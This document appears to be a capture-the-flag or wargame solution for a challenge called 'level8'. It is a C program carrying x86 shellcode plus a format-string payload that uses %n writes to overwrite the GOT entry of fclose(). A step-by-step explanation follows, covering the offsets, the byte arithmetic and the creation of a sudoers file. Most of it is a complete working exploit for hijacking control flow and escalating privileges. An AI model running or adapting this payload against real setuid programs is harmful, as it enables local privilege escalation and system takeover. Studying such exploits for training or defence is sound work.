#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

	unsigned char mc[] = "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6c\x33\x33\x74\x68\x69\x6e\x2f\x2f\x68\x61\x6c\x2f\x62\x68\x2f\x6c\x6f\x63\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80";

#define VULN "/var/challenge/level8/8"
#define RETLOC 0804a010 

int main(int argc, char **argv)
{
	char retaddr[] = 
	"AA"
	"\x10\xa0\x04\x08"
        "\x11\xa0\x04\x08"
       	"\x12\xa0\x04\x08"
       	"\x13\xa0\x04\x08"
       	"%161u%68$n"
       	"%70u%69$n"
	"%256u%70$n"
	"%192u%71$n";

	char *prgwprm[] = {VULN, retaddr, NULL};
	char *envp[] = {mc, NULL};

	execve(prgwprm[0], prgwprm, envp);
	return 0;
}

Steps:
Using a similar exploit program, shellcode was executed by overwriting the RETLOC of the fclose() function in the GOT table – found by using readelf [VULN] -r.
Utilizing Direct Parameter Access, I was able to find the offset was 68 but in order for all bytes of dummy input [AAAA] to be seen, I padded the input with [CC] - CCAAAA%68$n. 
In order to write to the address, I utilized %n to write all preceding bytes into the target. Each offset increments by one – writing to the byte addresses of retloc, by byte. 
The value 161 as 0xb9 is 185 in decimal. All preceding bytes of the input (padding, byte addresses, and string length already in buffer [<uid>:_]) adds up to 24, therefore we only need to input 161 
more bytes with %u. Following the same logic, 0xff = 255 and 185 bytes are already present, therefore 70 more bytes are needed. As the %n parameter cannot subtract, 
and as I’m performing a byte-by-byte write, I can utilize 0x1ff (1, being the least significant, byte is ignored). 0x1ff = 511, so 511-255 = 256: 256 bytes are needed. 
The same logic is used where 0x2bf = 703. 

fclose() was chosen as it directly followed the vulnerability, and once executed, the retloc address would be the address of the shellcode – executing upon function call. 

2 files needd to be created:
sudoers with my UID and sudolog to view output
